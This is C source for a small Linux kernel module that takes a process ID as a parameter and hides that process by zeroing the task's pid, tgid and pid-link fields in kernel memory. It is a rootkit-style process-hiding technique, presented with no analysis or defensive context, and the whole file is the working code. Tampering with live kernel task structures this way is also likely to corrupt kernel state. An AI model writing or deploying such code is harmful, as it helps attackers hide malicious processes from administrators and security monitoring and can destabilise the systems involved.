#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zihan Guo");

static pid_t pid = 0;
static struct task_struct *task = NULL;
module_param(pid, int, 0);
MODULE_PARM_DESC(pid, "The pid to hide");

int init_module(void)
{
        task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if(NULL == task){
                return 1;
        }
        task->pid = 0;
        task->tgid = 0;
	memset(task->pids, 0, sizeof(task->pids));
	return 0;
}

void cleanup_module(void)
{
        return;
}
